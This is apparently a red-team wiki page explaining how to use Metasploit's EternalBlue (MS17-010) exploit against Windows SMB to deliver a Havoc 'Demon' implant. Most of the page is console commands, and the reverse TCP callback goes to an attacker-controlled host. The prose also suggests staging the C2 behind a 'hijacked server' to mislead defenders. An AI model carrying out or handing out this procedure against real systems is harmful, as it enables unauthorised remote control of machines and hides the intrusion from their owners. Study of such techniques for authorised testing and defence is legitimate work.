---
author(s):
  - Userware
tags:
  - initial-access
  - exploitation
  - havoc
  - windows
credits:
  - p4p1
---
# Havoc

> [!NOTE]
> This section is subjected to change with different exploits as they get patched as time passes.

Unlike [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x00 - Exploitation/0xF - Remote Services Exploitation/Exploit Vulnerable Service/Cobalt Strike|cobalt strike]] exploitation setup. This particular payload type only requires a custom generated implant in this case **Havoc's Demon Agent**. We'll be using eternablue as an example.

```
msf6 > use exploit/windows/smb/ms17_010_eternalblue

msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/custom/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > options
```

Set the target's IP address.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts <target_IP>
```

Specify the C2's IP address and port. The best part about this is you can simply set the custom implant and use any SSH server (or hijacked server) as the only indicator of compromise that the defenders will look at the traces.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost <attacker_IP>

msf6 exploit(windows/smb/ms17_010_eternalblue) > set lport <attacker_PORT>

msf6 exploit(windows/smb/ms17_010_eternalblue) > set shellcode_file /local/path/to/demon.x64.bin
```

Exploit the target and you should receive an agent callback on your C2.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

---
## References

### p4p1

- [p4p1: Extending Havoc payloads through metasploit](https://leosmith.wtf/blog/metasploit-and-havoc.html)